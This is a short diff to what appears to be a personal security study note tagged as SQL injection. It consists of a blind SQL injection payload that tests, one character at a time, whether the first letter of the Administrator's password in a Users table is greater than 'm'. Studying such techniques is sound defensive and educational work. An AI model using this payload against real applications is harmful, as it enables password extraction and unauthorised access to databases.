@@ -1,4 +1,4 @@
-#sql
+#sql [[SQLi]]
 determine if the first symbol of password is greater than 'm':
 ```sql
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
